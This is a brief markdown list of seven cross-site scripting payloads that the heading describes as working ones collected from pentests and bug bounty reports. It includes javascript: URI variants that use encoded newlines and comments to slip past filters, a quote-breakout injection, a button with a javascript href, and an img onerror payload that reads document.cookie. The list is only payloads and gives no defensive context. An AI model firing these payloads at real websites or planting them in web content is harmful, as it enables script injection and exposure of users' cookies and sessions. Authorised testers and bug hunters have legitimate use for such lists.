## Some working XSS payloads collected from recent pentests and bug bounty reports 

- javascript://%0dalert() 
- javascript:/**/%0aalert()
- javascript://%0aalert(1)
- Ah'-alert('k0imet')-'?=
- <Button href="javascript://%0aalert(document.domain)">XSS</Button>
- javascript:alert(document.domain)
- <img src=x onerror=alert(document.cookie)>